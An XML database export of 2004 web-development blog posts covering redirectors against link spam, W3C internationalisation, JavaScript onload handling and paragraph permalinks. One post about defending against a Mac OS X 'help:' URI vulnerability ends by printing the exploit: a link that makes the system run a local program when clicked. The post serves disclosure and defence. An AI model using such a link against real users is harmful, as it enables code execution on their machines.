&lt;p&gt;Here's the real kicker: the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; redirector they are using is hosted on Google's primary domain. This is great news for people like myself who are running their own redirector, as the problem with having a redirect on your site is that it can be abused to make it look like people are visiting a specific site from a link on your domain: or even worse, to trick people in to visiting an unpleasant link (see &lt;a href=&quot;http://slashdot.org/&quot;&gt;Slashdot&lt;/a&gt; comments, where links are displayed along side the domain on which the &quot;real&quot; site is hosted). Now I can point my own PageRank stripper at &lt;samp&gt;http://www.google.com/url?sa=D&amp;amp;q=URL&lt;/samp&gt; and let Google handle the redirects for me. Lovely.&lt;/p&gt;

&lt;p&gt;Peter van Dijck recently &lt;a href=&quot;http://poorbuthappy.com/ease/archives/002901.html&quot;&gt;joined&lt;/a&gt; the ranks of victims of wiki spam. Let's start rolling this technique out on Wikis as well. The trade-off in lost PageRank for linked sites is more than worth it.&lt;/p&gt;</field>
		<field name="created">2004-05-11 07:56:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1410</field>
		<field name="title">W3C Internationalisation Guidelines</field>
		<field name="slug">i18n</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://philringnalda.com/blog/2004/05/i18n_in_digestible_chunks.php&quot; title=&quot;I18n in digestible chunks&quot;&gt;Phil Ringnalda&lt;/a&gt;, the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; have published three useful articles on &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; internationalisation techniques. In classic &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; style, the boilerplate and verbiage at the start of the documents threatens to overwhelm the actual content. Here's a tip: jump straight to chapter 2, which is normally where the interesting stuff starts. Here are the ammended links:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/i18n-html-tech-char/#IDAPNFO&quot;&gt;Choosing a page encoding&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/i18n-html-tech-lang/#ri20030510.102829377&quot;&gt;Declaring the language of content&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/i18n-html-tech-bidi/#IDAMJFO&quot;&gt;Handling Bidirectional Text&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


</field>
		<field name="created">2004-05-11 17:12:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1411</field>
		<field name="title">Simple mini-languages with PHP</field>
		<field name="slug">simpleMiniLanguages</field>
		<field name="body">&lt;p&gt;I linked to &lt;a href=&quot;http://pdml.sourceforge.net/&quot;&gt;PDML&lt;/a&gt; the other day in &lt;a href=&quot;http://simon.incutio.com/blogmarks/2004/05/08/&quot; title=&quot;Blogmarks for 8th May 2004&quot;&gt;my blogmarks&lt;/a&gt;, but beyond a cursory glance I hadn't really dug in to what makes it tick. Dumky over at &lt;a href=&quot;http://blog.monstuff.com/archives/000175.html&quot; title=&quot;PDML PHP tricks&quot;&gt;Curiosity is bliss&lt;/a&gt; points out that it makes use of an ingenious output buffering trick. To create a &lt;acronym title=&quot;Portable Document Markup Language&quot;&gt;PDML&lt;/acronym&gt; document, you add a single line to the top of a page that includes and executes the &lt;acronym title=&quot;Portable Document Markup Language&quot;&gt;PDML&lt;/acronym&gt; library (written in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;). The rest of the document is written in the custom &lt;acronym title=&quot;Portable Document Markup Language&quot;&gt;PDML&lt;/acronym&gt; markup language. The script uses output buffering to capture the rest of the page, then executes a callback function that actually processes the page content (see &lt;a href=&quot;http://www.php.net/ob_start&quot;&gt;ob_start()&lt;/a&gt; for details).&lt;/p&gt;

&lt;p&gt;As Dumky points out, this can be used to implement mini-languages for pretty much anything - and &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5's excellent &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; support means most of the parser work is handled for you. It could also act as a neat way of hooking in to things like server-side &lt;acronym title=&quot;Extensible Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt; processors.&lt;/p&gt;</field>
		<field name="created">2004-05-12 21:59:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1412</field>
		<field name="title">Supplemental Results</field>
		<field name="slug">supplementalResult</field>
		<field name="body">&lt;p&gt;Does anyone know what Google means when it says that something is a &lt;a href=&quot;http://www.google.com/search?q=tortured+artist+skater+goth+jock&quot;&gt;&quot;Supplemental Result&quot;&lt;/a&gt;?&lt;/p&gt;</field>
		<field name="created">2004-05-13 07:22:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1413</field>
		<field name="title">Defending against the OS X help: vulnerability</field>
		<field name="slug">defending</field>
		<field name="body">&lt;p&gt;There's a nasty &lt;a href=&quot;http://secunia.com/advisories/11622/&quot; title=&quot;Mac OS X URI Handler Arbitrary Code Execution&quot;&gt;OS X vulnerability&lt;/a&gt; under discussion at the moment which lets a web page execute code on your machine by taking advantage of a flaw in the &quot;help:&quot; protocol. There's a non-malicious demonstration of the exploit &lt;a href=&quot;http://bronosky.com/pub/AppleScript.htm&quot; title=&quot;Demo: will execute &amp;apos;du&amp;apos; command in a console window&quot;&gt;on this page&lt;/a&gt;, and Jay Allen is &lt;a href=&quot;http://www.jayallen.org/journey/2004/05/mac_os_x_highly_critical_security_flaw&quot; title=&quot; Mac OS X: Highly critical security flaw&quot;&gt;hosting a discussion&lt;/a&gt; on the exploit and ways to avoid it.&lt;/p&gt;

&lt;p&gt;To save you from digging through the discussion, the quickest way to defend yourself is to install the &lt;a href=&quot;http://www.monkeyfood.com/software/moreInternet/&quot;&gt;More Internet&lt;/a&gt; preference pane (mount the &lt;acronym title=&quot;Disk iMaGe&quot;&gt;DMG&lt;/acronym&gt;, then copy the &lt;samp&gt;More Internet.prefPane&lt;/samp&gt; file to your /Library/PreferencePanes folder or run the &quot;install prefpane&quot; script). Then go to system preferences, launch the &quot;More Internet&quot; panel, select the &quot;help&quot; protocol and use the Change button to assign it to some non-harmful application such as Chess (simply deleting the protocols will not solve the problem). While you're there it's a good idea to add a new protocol called &quot;disk&quot; and assign it to a non-harmful application as well - this prevents malicious sites from being able to auto-mount networked disk images on your system, something which while not exploitable on its own can be used in conjunction with other exploits (like the help: one) to execute arbitrary code.&lt;/p&gt;

&lt;p&gt;For those who are interested, it seems the exploit itself is as simple as this:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;html&quot;&gt;
&amp;lt;a href=&quot;help:runscript=MacHelp.help/Contents/Resources/English.lproj/shrd/OpnApp.scpt string=usr:bin:top&quot;&amp;gt;click to run 'top'&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/p&gt;</field>
		<field name="created">2004-05-18 21:02:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1414</field>
		<field name="title">Atom discussion minutes</field>
		<field name="slug">customisedWithCSS</field>
		<field name="body">&lt;p&gt;The minutes from the Atom/&lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; discussion in New York have been &lt;a href=&quot;http://www.w3.org/2004/05/18-atom-nyc&quot;&gt;posted online&lt;/a&gt;. Unfortunately the default formatting is pretty difficult to follow. I found it a lot easier to figure out who was saying what after applying the following &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; (using the &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html#test_styles&quot; title=&quot;Web Development Bookmarklets: test styles&quot;&gt;test styles&lt;/a&gt; bookmarklet):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;
abbr {
  display: block;
  margin-top: 1em;
  margin-bottom: 0.5em;
  font-weight: bold;
}
abbr:after {
  content: &quot; - &quot; attr(title);
}
&lt;/code&gt;&lt;/pre&gt;</field>
		<field name="created">2004-05-18 22:24:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1415</field>
		<field name="title">Domain Keys Explained</field>
		<field name="slug">domainKeys</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/002010.html&quot; title=&quot;DomainKeys Documentation Now Available&quot;&gt;Jeremy Zawodny,&lt;/a&gt;, Yahoo's &lt;a href=&quot;http://antispam.yahoo.com/&quot;&gt;Anti-Spam Resource Center&lt;/a&gt; have published an explanation of their proposed &lt;a href=&quot;http://antispam.yahoo.com/domainkeys&quot;&gt;Domain Keys&lt;/a&gt; spam fighting technique. At first glance it looks very promising. There's no centralised authority, no requirements for changes to existing protocols and the central concept is extremely easy to understand. Essentially, mail servers generate a public/private key pair and sign outgoing messages with the private key, while publishing the public key as part of their &lt;acronym title=&quot;Domain Name Service&quot;&gt;DNS&lt;/acronym&gt; record. Because only they can publish to their public key in this way the signature can be used to confirm that the sender of the email has not been spoofed. The presence or lack of a signature can be used as part of the process of identifying spam.&lt;/p&gt;

&lt;p&gt;The &lt;acronym title=&quot;Frequently Asked Questions&quot;&gt;FAQ&lt;/acronym&gt; covers all the bases I could think of, and explains how Domain Keys can help fight phishing attacks as well.&lt;/p&gt;</field>
		<field name="created">2004-05-19 02:04:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1416</field>
		<field name="title">TBL on TLDs</field>
		<field name="slug">tbl</field>
		<field name="body">&lt;p&gt;Tim Berners Lee (how many &lt;acronym title=&quot;Three Letter Acronym&quot;&gt;TLA&lt;/acronym&gt; celebrities is that now?): &lt;a href=&quot;http://www.w3.org/DesignIssues/TLD&quot;&gt;New Top Level Domains Considered Harmful&lt;/a&gt;. Read the whole thing - Tim blows the .xxx and .mobi proposals out of the water and takes a neat swipe at for-profit registrars in the process. Reading this, the main thing that struck me is how incredibly forward thinking &lt;acronym title=&quot;Tim Berners Lee&quot;&gt;TBL&lt;/acronym&gt; really is. People complain about the long duration of &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; processes and the futuristic nature of the semantic web but the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; are trying to build technologies that will still be relevant ten or twenty years from now. When you consider the longevity of &lt;acronym title=&quot;Transfer Control Protocol / Internet Protocol&quot;&gt;TCP/IP&lt;/acronym&gt;, this is a really smart strategy. It's a shame so many people involved with the web have trouble thinking past the next few months.&lt;/p&gt;</field>
		<field name="created">2004-05-22 06:23:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1417</field>
		<field name="title">Executing JavaScript on page load</field>
		<field name="slug">addLoadEvent</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Peter-Paul Koch &lt;a href=&quot;http://www.digital-web.com/articles/separating_behavior_and_structure_2/&quot; title=&quot;Separating behavior and structure&quot;&gt;recently wrote&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.digital-web.com/articles/separating_behavior_and_structure_2/&quot;&gt;&lt;p id=&quot;p-1&quot;&gt;In my opinion, recent advances in JavaScript theory call for the removal of the event handlers that some Web developers-and all WYSIWYG editors-deploy in large masses in their XHTML files, where they don’t belong.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;acronym title=&quot;Peter-Paul Koch&quot;&gt;PPK&lt;/acronym&gt; is talking about inline event attributes such as the infamous &lt;code class=&quot;html&quot;&gt;onclick=&quot;&quot;&lt;/code&gt; and &lt;code class=&quot;html&quot;&gt;onmouseover=&quot;&quot;&lt;/code&gt; which have infested our &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; ever since Netscape introduced JavaScript back in version 2.0 of their browser. The alternative to these handlers is to add event handlers to elements after the document has loaded. &lt;acronym title=&quot;Peter-Paul Koch&quot;&gt;PPK&lt;/acronym&gt; has detailed coverage of the various ways of doing this &lt;a href=&quot;http://www.quirksmode.org/js/introevents.html&quot; title=&quot;Introduction to Events&quot;&gt;on his QuirksMode site&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;In my work with unobtrusive JavaScript, I've found that by far the most common action I take is &quot;registering&quot; a script to be executed once the page has finished loading. There are a number of ways of doing this, which I described in my article &lt;a href=&quot;http://www.sitepoint.com/article/structural-markup-javascript&quot;&gt;Enhancing Structural Markup with JavaScript&lt;/a&gt;. Unfortunately, none of them are perfect if you wish to write truly reusable scripts.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;For a script (such as my blockquote citations script discussed in the article) to be properly reusable, it needs to behave nicely in the presence of other scripts. This means that assigning a callback function directly to the &lt;code class=&quot;javascript&quot;&gt;window.onload&lt;/code&gt; handler is out of the question as doing so will over-ride previously assigned callbacks from other scripts. The correct way of adding a handler to an event without over-riding other handlers is to use modern event attachment method, which sadly differ between &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;/Windows and other browsers. Scott Andrew's &lt;a href=&quot;http://www.scottandrew.com/weblog/jsjunk#events&quot; title=&quot;addEvent / removeEvent&quot;&gt;addEvent function&lt;/a&gt; handles the differences for you but comes with one major and rarely discussed drawback: it fails silently in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;5/Mac. If you care about the many Mac users still on OS9, you need to support that browser.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Anyway, I believe I've found a solution. Check this out:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
function addLoadEvent(func) {
  var oldonload = window.onload;
  if (typeof window.onload != 'function') {
    window.onload = func;
  } else {
    window.onload = function() {
      if (oldonload) {
        oldonload();
      }
      func();
    }
  }
}

addLoadEvent(nameOfSomeFunctionToRunOnPageLoad);
addLoadEvent(function() {
  /* more code to run on page load */ 
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-6&quot;&gt;The &lt;code class=&quot;javascript&quot;&gt;addLoadEvent&lt;/code&gt; function takes as an argument another function which should be executed once the page has loaded. Unlike assigning directly to &lt;code class=&quot;javascript&quot;&gt;window.onload&lt;/code&gt;, the function adds the event in such a way that any previously added onload functions will be executed first.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;The way this works is relatively simple: if &lt;code class=&quot;javascript&quot;&gt;window.onload&lt;/code&gt; has not already been assigned a function, the function passed to &lt;code class=&quot;javascript&quot;&gt;addLoadEvent&lt;/code&gt; is simply assigned to &lt;code class=&quot;javascript&quot;&gt;window.onload&lt;/code&gt;. If &lt;code class=&quot;javascript&quot;&gt;window.onload&lt;/code&gt; has already been set, a brand new function is created which first calls the original onload handler, then calls the new handler afterwards.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;&lt;code class=&quot;javascript&quot;&gt;addLoadEvent&lt;/code&gt; has one very important property: it will work even if something has previously been assigned to window.onload without using &lt;code class=&quot;javascript&quot;&gt;addLoadEvent&lt;/code&gt; itself. This makes it ideal for use in scripts that may be executing along side other scripts that have already been registered to execute once the page has loaded.&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;I've tested the above code successfully on &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5, 5.5 and 6 for Windows; &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 and Safari for Mac; Opera 7.5 and FireFox on Mac (which should mean it works with those browsers on Windows as well). Opera 6 for Mac failed the test but has poor JavaScript support anyway and is hopefully becoming more and more rare now that Opera 7 has matured.&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;I've created &lt;a href=&quot;http://simon.incutio.com/code/js/addloadevent/&quot; title=&quot;addLoadEvent() test&quot;&gt;a test page&lt;/a&gt; for the function. I'd be interested to here any bug reports from browsers I haven't covered.&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;I'm still considering ways in which this technique could be extended to work for generic events rather than just page loads. The challenge there would be to ensure that information about the event itself was passed to the event handlers in a consistent manner. For page load events this isn't an issue as the event object does not contain any valuable information.&lt;/p&gt;

&lt;p id=&quot;p-12&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; I've written the new technique up &lt;a href=&quot;http://www.sitepoint.com/blog-post-view.php?id=171578&quot; title=&quot;Closures and executing JavaScript on page load&quot;&gt;on my SitePoint blog&lt;/a&gt; and incorporated an explanation of closures and how they are used to preserve any previously assigned onload handlers.&lt;/p&gt;

&lt;p id=&quot;p-13&quot;&gt;&lt;strong&gt;Update 28th May 2006&lt;/strong&gt;: Billy Pan pointed out that the original code caused a runtime error in IE 7. His fix was to add an &lt;code&gt;if (oldonload)&lt;/code&gt;; I have rolled this fix in to the code shown above.&lt;/p&gt;</field>
		<field name="created">2004-05-26 06:30:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1418</field>
		<field name="title">Time to fix those broken pages</field>
		<field name="slug">fix</field>
		<field name="body">&lt;p&gt;I have a whole bunch of gripes about Internet Explorer, but my personal favourite is the way it will render a document served with a &lt;code&gt;text/plain&lt;/code&gt; Content-Type header if it thinks the file might contain &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. The direct result of this is that people with misconfigured web servers who are serving their &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; with the wrong Content-Type frequently don't realise, so when users of better behaved browsers such as FireFox visit they get hit in the face with a page of raw source code.&lt;/p&gt;

&lt;p&gt;The times they are a-changing. I just spotted this gem in &lt;acronym title=&quot;MicroSoft Developers Network&quot;&gt;MSDN&lt;/acronym&gt;'s article &lt;a href=&quot;http://msdn.microsoft.com/asp.net/using/understanding/security/default.aspx?pull=/library/en-us/dnwxp/html/xpsp2websites.asp&quot;&gt;How to Make Your Web Site Work with Windows XP Service Pack 2&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://msdn.microsoft.com/asp.net/using/understanding/security/default.aspx?pull=/library/en-us/dnwxp/html/xpsp2websites.asp&quot;&gt;&lt;p&gt;&lt;strong&gt;Q: Does your Web site contain files with file types that do not match their Content-Type and/or file extension?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A: You should correct all of these mismatches. Both the Content-Type and the file extension must match the type of the file for a download prompt to appear. Be sure this is true for your Web pages as well. If the Content-Type is plain/text, then they will not render as HTML.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Of course, the rate at which people upgrade to service pack 2 is likely to be pretty poor but at least new machines will have it installed by default. Hopefully sites serving the wrong Content-Type for their &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; documents will be forced to clean up pretty quickly.&lt;/p&gt;

&lt;p&gt;The other issue mentioned in that quotation - forcing the file extension to match the Content-Type - is a little odd from a non-Windows &lt;acronym title=&quot;Operating System&quot;&gt;OS&lt;/acronym&gt; point of view but I'm sure there's a rational reason behind it. At the end of the day, anything that improves Windows security is a good thing for the health of both the Internet and society in general.&lt;/p&gt;</field>
		<field name="created">2004-05-29 23:46:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1419</field>
		<field name="title">plinks - a purple numbers variant</field>
		<field name="slug">plinks</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Via &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2004/05/29/PurpleNumbers&quot; title=&quot;Purple Number Signs&quot;&gt;Tim Bray&lt;/a&gt;, I came across the concept of &lt;a href=&quot;http://www.eekim.com/software/purple/purple.html&quot; title=&quot;An Introduction to Purple&quot;&gt;Purple Numbers&lt;/a&gt;. In a nutshell these are permalinks attached to every paragraph on a page which, to paraphrase Tim, make every paragraph on a page a first-class Web citizen.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;That's a very worthy concept, but the implementations I've seen have so far failed to inspire me. First of all, while the ability to link to any paragraph on a page is useful, the links themselves are either ugly, distracting or both. While reading &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2004/05/29/PurpleNumbers&quot; title=&quot;Purple Number Signs&quot;&gt;Tim's entry&lt;/a&gt; I found myself mentally pausing after each paragraph: probably because I'm used to the purple # marks on &lt;a href=&quot;http://www.scripting.com/&quot;&gt;Scripting News&lt;/a&gt; and other such sites designating the end of an entry. They're also extra cruft in my markup.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;So, my ideal purple numbers implementation would minimise markup pollution and visual clutter.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Another issue with purple numbers is permanency: they're absolutely no good if they don't stay as true permalinks. This rules out naively generating them on the fly when a page is outputted as future edits to an article could result in links targetting different paragraphs entirely. Instead, the links (in the form of id attributes on paragraph tags) need to be assigned when the content is created. If additional paragraphs are later added to the content they should be numbered in such a way as not to intefere with the original paragraph links, which I shall call plinks for the sake of brevity.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;We'll ignore the issue of visual clutter for the moment: let's look instead at how plinks can be introduced without polluting the markup of my pages. While the IDs that form the target of the links are a critical part of the structure of the page, the actual links are something of a convenience for people who don't want to dig through my source code looking for IDs and are unaware of the various bookmarklets that can reveal them (such as Jesse Ruderman's &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html#named_anchors&quot;&gt;named anchors&lt;/a&gt;). As such, I don't see the links as a critical part of the page content, so I have no qualms whatsoever about appending them to the page using JavaScript after the page has loaded. Here's the function I'm using:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
function addpLinks() {
  var paras = document.getElementsByTagName('p');
  for (var i = 0; i &amp;lt; paras.length; i++) {
    var current = paras[i];
    if (/^p-/.test(current.id)) {
      // It's a purple link paragraph
      var plink = document.createElement('a');
      plink.href = document.location.href.split('#')[0] + 
        '#' + current.id;
      plink.className = 'plink';
      plink.appendChild(document.createTextNode(' #'));
      current.appendChild(plink);
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-5&quot;&gt;The function iterates over every paragraph on the page looking for paragraphs with an id that starts with &quot;p-&quot;, my chosen format for plink IDs. When it finds one, it creates a new link using the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; and assigns it an href attribute which is the base &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; of the current page (not including any existing fragment identifier) with a # and the paragraph's ID appended on the end.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;My plinks all have a class of &quot;plink&quot;, which allows me to style them. This is where I can reduce the visual clutter on the page as much as possible. Consider the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;
p a.plink {
  text-decoration: none;
  color: #c8a8ff;
  display: none;
}
p:hover a.plink {
  display: inline;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-7&quot;&gt;In an ideal world this would make the links invisible until the mouse cursor was positioned over the containing paragraph. Unfortunately, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; for Windows only honors the :hover pseudo-selector when it is applied to links. I'd like &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; users to have at least a chance of discovering my plinks, so I came up with this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;
p a.plink {
  text-decoration: none;
  color: #fff; /* the page background colour */
}
p:hover a.plink, p a:hover.plink {
  color: #c8a8ff;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-8&quot;&gt;The plinks are initially invisible by virtue of having the same colour as the page background. In browsers that support :hover on paragraphs, they become visible (by changing colour) when the mouse hovers over the paragraph. In browsers that only support :hover on links, they become visible when the mouse hovers over the links. Sure, they're a lot harder to find but I see it as an easter egg for &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; users. Another example of &lt;a href=&quot;http://www.mezzoblue.com/archives/2003/06/25/mose/&quot; title=&quot;Mozilla/Opera/Safari enhancement&quot;&gt;MOSe&lt;/a&gt; in action.&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;There are a couple of more pieces to the puzzle. Firstly, adding all of those IDs to those paragraph tags is the kind of task that humans avoid and computers thrive on. Now I could automate this in my &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt;, but I'm not in the mood for &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; at the moment so I've automated it in a bookmarklet instead: &lt;a href=&quot;javascript:(function() { var tas = document.getElementsByTagName(&amp;apos;textarea&amp;apos;); for (var i = 0; i &amp;lt; tas.length; i++) { var ta = tas[i]; var text = ta.value.replace(/&amp;lt;p&amp;gt;/g, function() { if (typeof arguments.callee.counter == &amp;apos;undefined&amp;apos;) { arguments.callee.counter = 0; } return &amp;apos;&amp;lt;p id=&amp;quot;p-&amp;apos;+arguments.callee.counter++ +&amp;apos;&amp;quot;&amp;gt;&amp;apos;; }); ta.value = text; } })();&quot;&gt;Add plink IDs&lt;/a&gt; (drag to your bookmarks). The bookmarklet will look inside any textareas on the current page and add an ID to every paragraph, provided it's a simple &lt;code class=&quot;html&quot;&gt;&amp;lt;p&amp;gt;&lt;/code&gt;. It's something of a quick hack but it does the job. Here's the bookmarklet code expanded to show how it works:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
javascript:(function() {
  var tas = document.getElementsByTagName('textarea');
  for (var i = 0; i &amp;lt; tas.length; i++) {
    var ta = tas[i];
    var text = ta.value.replace('&amp;lt;p&amp;gt;', function() {
      if (typeof arguments.callee.counter == 'undefined') {
        arguments.callee.counter = 0;
      }
      return '&amp;lt;p id=&quot;p-'+arguments.callee.counter++ +'&quot;&amp;gt;';
    });
    ta.value = text;
  }
})();
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-10&quot;&gt;Incidentally, the above uses a technique I picked up today while flicking through David Flanagan's eternally useful &lt;cite&gt;JavaScript: The Definitive Guide&lt;/cite&gt;. Inside a JavaScript function a special object called &lt;code&gt;arguments&lt;/code&gt; is available. The object has a property called &lt;code&gt;callee&lt;/code&gt; which refers to the function itself, even if as above it's an anonymous function. Since functions are objects they can have properties: in this case, I create a &lt;code&gt;counter&lt;/code&gt; property and use it to keep track of the IDs as I assign them. The whole lot is contained within a function argument to a replace call, where the function is called every time a &lt;code class=&quot;html&quot;&gt;&amp;lt;p&amp;gt;&lt;/code&gt; is found to determine what to replace it with.&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;At this point I had everything I needed, but then inspiration struck: how about a method of highlighting a paragraph if a user should visit a page using a link that targetted it? Suporting this meant adding yet another function to be executed once the page had loaded:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;
function plinkHighlight() {
  if (/#p-/.test(document.location)) {
    // The user arrived via a plink
    var plink_id = document.location.split('#')[1];
    var para = document.getElementById(plink_id);
    para.className = para.className + ' plinkHighlight';
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-12&quot;&gt;A custom style for the highlighted paragraph can now be defined using the plinkHighlight class hook.&lt;/p&gt;

&lt;p id=&quot;p-13&quot;&gt;I've now implemented all of the above on this site (mostly in the file &lt;a href=&quot;http://simon.incutio.com/js/plinks.js&quot;&gt;plinks.js&lt;/a&gt;) although currently this is the only entry that contains plink IDs. Best of all, I didn't have to touch a single line of my &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt;! This JavaScript thing could really catch on some day.&lt;/p&gt;</field>
		<field name="created">2004-05-30 08:45:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1420</field>
		<field name="title">A few more thoughts on plinks</field>
		<field name="slug">morePlinks</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;From the &lt;a href=&quot;http://simon.incutio.com/archive/2004/05/30/plinks#comments&quot;&gt;comments on my plinks entry&lt;/a&gt;, it seems some people are seeing ugly green hash marks all over the place. If that includes you, you need to force-reload my &lt;a href=&quot;http://simon.incutio.com/green.css&quot;&gt;stylesheet&lt;/a&gt; to ensure you are getting the copy with the plink hiding styles.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;One of the things I missed in last night's 1am coding frenzy was the idea of globally unique identifiers for every paragraph, as &lt;a href=&quot;http://www.burningchrome.com:8000/~cdent/mt/archives/000277.html&quot; title=&quot;Big Day for Purple Numbers&quot;&gt;described by Chris Dent&lt;/a&gt;. This leads in to a fascinating concept called &lt;a href=&quot;http://www.burningchrome.com:8000/~cdent/wiki.cgi?TransClusion&quot;&gt;Transclusion&lt;/a&gt;, which originated with Ted Nelson (the father of hypertext) and involves content that is managed by reference.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Now interesting though Transclusion is I'm not convinced that it's a useful addition to my blog. However, there is a far more pressing need for globally unique paragraph idenfifiers that has only just cropped up: my &lt;a href=&quot;http://simon.incutio.com/&quot;&gt;index page&lt;/a&gt;. On it, I display a number of different entries at once. IDs in &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; must be unique for the current document, so if I have two entries on the front page that contain paragraphs with clashing identifiers I lose validity and, most probably, &lt;a href=&quot;http://www.google.com/search?q=%22every+time+you%22+%22god+kills+a+kitten%22+-masturbate+-masterbate+-masterbait&quot; title=&quot;via Mark Pilgrim&amp;apos;s blinks&quot;&gt;God kills a kitten&lt;/a&gt;.&lt;/p&gt;

